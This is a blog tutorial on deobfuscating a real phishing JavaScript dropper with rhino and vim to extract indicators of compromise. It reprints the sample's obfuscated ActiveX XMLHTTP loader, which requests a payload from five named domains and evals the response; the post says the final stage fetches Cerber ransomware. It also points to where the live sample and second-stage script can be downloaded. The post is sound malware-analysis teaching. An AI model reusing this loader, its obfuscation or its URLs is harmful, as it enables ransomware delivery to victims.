---
layout: post
title:  "Simple Js deobfuscation 1"
date:   2017-08-28 12:00:00 +0700
categories: Javascript deobfuscation
---

A first example of javascript deofuscation for IOC extraction.

## First hand on javascript deobfuscation
For this excercice we will use a really simple real javascript that was used on mass phishing campaign to drop payload into the target's computer.
You can find the malicious javascript here :

On hybrid-analysis :

**hash** : 0413a0c095230c5a1d9fd24c5526e381

(You need to have a free account on hybrid-analysis to be able to download sample) This website is really interessting if you are looking for sample to analyse :)
[Link to the Hybrid-analysis sample]( https://www.hybrid-analysis.com/download-sample/90d8e7b7149fff458d5ce7adc173dcf323788460da33247be9718f8930edc8a3?environmentId=100)

### Take care ! This sample is real and can be dangerous if you manipulate it in a real environment :)
I'm going to do this analysis on a linux system (SIFT workstation).

I'have installed rhino a little cli javascript shell. Really useful :)

But you can do big part of this exercice with Firefox using the console available when you type F12.
First check the file type :
{% highlight shell %}
file 0413a0c095230c5a1d9fd24c5526e381 0413a0c095230c5a1d9fd24c5526e381: ASCII text, with CRLF line terminators
{% endhighlight %}
... Nothing much, ok it's an ASCII text file we are safe to open it into any text editor (VIm, emacs, leafpad, nano ...).
Just by opening you see that the obfuscation used here is not advanced :
{% highlight javascript %}
var sder = "P"; var g2 = "M"+"sxml2.XMLHT"+""+"T"+""+sder;
var m = "LRAf7gyufKYR4MwFaLGaGyC-AIyJR0x4H3WREwqTezLd5P35obsIzYt3pHkF6oEqDeW3A5bvDPm0e4k9RekqVS20SQTDNnIlK_k";
var x = new Array("residences.springcreekranch.org", "fitnessdigezt.com", "ronniespersonaltouchjanitorialservice.com", "constructivemindfulness.com", "rorokindergarten.ro");
var t4 = "ht"+"tp";
var pi6dnz = "\x70"+"\x65\x6E";
var zaima = "qwadro";
var ter = "/";
{% endhighlight %}

 We can see severals variables declaration, some of them are really self explanatory

* x : variable contains some domain/subdomain name. You already find your IOC ;)

* t4 : contains "http" must be used to declare the url where is stored the payload :)

* g2 : is pretty easy to understand to, just a concatenation of strings and another variable.

* pi6dnz : is more difficult but when you look at the type of character used you can see that they are hexadecimal value. If you look at your ascii table ...
{% highlight shell %}
man ascii
{% endhighlight %}

You can see that the hexadecimal value 70 = p 65 = e 6E = n
...p e n... ok it might be used somewhere else later ..
* m : this one is the hardest to understand, we will see it later.

Ok let's use rhino on this small parts.

If you don't have rhino you can install it on a ubuntu based distro just by typing :

{% highlight shell %}
apt-get install rhino
{% endhighlight %}

Then just start it :

{% highlight javascript %}
rhino js >
{% endhighlight %}

Just take the variable you want and copy paste it.
I'm going to use t4 and pi6dnz and print them using the print(); function (Simple :p)

{% highlight javascript %}
js> var pi6dnz = "\x70"+"\x65\x6E";
js> var t4 = "ht"+"tp";
js> print(t4);
http
js> print(pi6dnz);
pen
{% endhighlight %}

Ok i think you understand the concept now.
Let's continue with the other part of the js

{% highlight javascript %}
for (var i=0; i<x.length; i++)
{
var vDJmB = function(){ return new ActiveXObject(g2); }(); var e = vDJmB; try {
var raspbna2s=["\x6F"+pi6dnz]; e[raspbna2s[0]](""+"G"+""+"E"+""+"T", t4 + ":"+ter+ter+x[i]+"/c"+"o"+"u"+"nter/?"+m,false); e.send();
}
{% endhighlight %}

First we enter in a for loop with i incrementing.

Then a function declaration creating an ActiveXObject with the parameter g2. If you played a little bit with rhino you will find that :

{% highlight javascript %}
js> print(g2); Msxml2.XMLHTTP
{% endhighlight %}

Just after it, we can see the creation of an object called e.
{% highlight javascript %}
var e = vDJmB;
{% endhighlight %}
So e is a ActiveXObject.


Here we enter in a try and then a new declaration of variable :
{% highlight javascript %}
var raspbna2s=["\x6F"+pi6dnz];
{% endhighlight %}

We find pi6dnz back, 6F is the ascii for o so o + pen = .... ? ;)

And then the big query :

{% highlight javascript %}
e[raspbna2s[0]](""+"G"+""+"E"+""+"T", t4 + ":"+ter+ter+x[i]+"/c"+"o"+"u"+"nter/?"+m,false);
{% endhighlight %}

If you try to print this with rhino here there will be 2 little trick:
First you need to remove the e because it's a object. You also need to change i to the number 0 (it's related to the domain name list that we saw earlier. It's an array so incrementing i will change the domain name requested.

And there is also the false at the end to remove.


If you go to msdn.microsoft.com about the function used here you will find your scheme
{% highlight javascript %}
var xmlhttp = new ActiveXObject("Msxml2.XMLHTTP.3.0"); xmlhttp.open("GET","http://localhost/books.xml", false);
xmlhttp.send();
{% endhighlight %}

In rhino add all variable or create a little js script :

{% highlight javascript %}
var sder = "P";
var g2 = "M"+"sxml2.XMLHT"+""+"T"+""+sder;
var m = "LRAf7gyufKYR4MwFaLGaGyCAIyJR0x4H3WREwqTezLd5P35obsIzYt3pHkF6oEqDeW3A5bvDPm0e4k9RekqVS20SQTDNnIlK_k";
var x = new Array("residences.springcreekranch.org", "fitnessdigezt.com", "ronniespersonaltouchjanitorialservice.com", "constructivemindfulness.com", "rorokindergarten.ro");
var t4 = "ht"+"tp";
var pi6dnz = "\x70"+"\x65\x6E";
var zaima = "qwadro";
var ter = "/";
var raspbna2s=["\x6F"+pi6dnz];
var i = 0;
print(raspbna2s[0] + ""+"G"+""+"E"+""+"T", t4 + ":"+ter+ter+x[i]+"/c"+"o"+"u"+"nter/?" + m);
{% endhighlight %}

Tada, you will see the full url requested by the javascript.

After this the script try to receive what was requested.

You will need to download with a wget the malicious script to continue :)

With a simple wget you can download the payload.

I you open it with vim you can see we have more obfuscated js.

Go back to your first js and let's look at the operation done on the answer of the server (the url that you downloaded trough wget.

{% highlight javascript %}  
reqty(e.responseText.split(m).join(zaima.substring(2,3)));
{% endhighlight %}

We can see that we have some kind of substition of the m variable and added at the end the third character of the variable zaima (that is a).

We can do the same kind of substition using vim and sed. Or any text editor that allow to replace character by other :)

So we have to replace LRAf7gyufKYR4MwFaLGaGyC-AIyJR0x4H3WREwqTezLd5P35obsIzYt3pHkF6oEqDeW3A5bvDPm0e4k9RekqVS20SQTDNnIlK_k by a

{% highlight shell %}
vim JS.txt
:s/LRAf7gyufKYR4MwFaLGaGyC-AIyJR0x4H3WREwqTezLd5P35obsIzYt3pHkF6oEqDeW3A5bvDPm0e4k9RekqVS20SQTDNnIlK_k/a/g
{% endhighlight %}

You will then have a JS with lots of variable incrementation var NXmef= "...." var NXmef+="..."
Lots of stuff are added to the string.
To easilty see what is inside this long string just check a the end of the JS. change the eval(NXmef) by a simple print

{% highlight javascript %}
print(NXmef);
{% endhighlight %}

The unobfuscated Js code will then be available with new IOC (new urls used :) ).
This javascript code download a executable that is a ransomwar : cerber.
